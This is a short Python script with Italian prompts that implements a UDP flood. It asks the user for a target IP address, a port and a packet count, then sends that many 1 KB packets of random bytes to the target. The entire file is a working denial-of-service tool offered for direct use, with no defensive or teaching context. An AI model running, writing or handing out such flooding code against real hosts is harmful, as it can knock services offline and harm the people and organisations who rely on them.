import socket
import random

def generate_random_bytes(size):
    return bytes([random.randint(0, 255) for _ in range(size)])

def udp_flood():
    target_ip = input("Inserisci l'IP della macchina target: ")
    target_port = int(input("Inserisci la porta UDP della macchina target: "))
    num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    packet_size = 1024  # 1 KB
    sent_packets = 0

    print(f"Iniziando l'invio di {num_packets} pacchetti a {target_ip}:{target_port}")

    for _ in range(num_packets):
        packet = generate_random_bytes(packet_size)
        try:
            sock.sendto(packet, (target_ip, target_port))
            sent_packets += 1
            print(f"Pacchetto {sent_packets} inviato", end="\r")
        except Exception as e:
            print(f"Errore nell'invio del pacchetto: {e}")
    
    print(f"\nInvio completato. {sent_packets} pacchetti inviati.")
    sock.close()

if __name__ == "__main__":
    udp_flood()